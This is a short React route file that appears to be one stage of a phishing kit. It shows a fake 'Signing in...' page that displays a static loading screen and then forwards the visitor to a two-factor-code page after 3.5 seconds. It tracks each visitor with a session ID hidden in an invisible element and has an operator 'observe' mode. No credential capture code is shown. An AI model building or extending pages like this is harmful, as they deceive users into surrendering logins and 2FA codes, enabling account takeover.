import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { GeIframe } from "@/components/ge/GeIframe";
import { useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({ meta: [{ title: "Signing in..." }] }),
  component: GeLoadingPage,
});

function GeLoadingPage() {
  const { sessionId, geNavigate, isObserve } = useGeTracking();

  useEffect(() => {
    if (isObserve) return;
    const t = setTimeout(() => geNavigate("/ge/twofa"), 3500);
    return () => clearTimeout(t);
  }, [isObserve, geNavigate]);

  return (
    <>
      <GeIframe src="/ge-html/loading.html" title="Loading" />
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
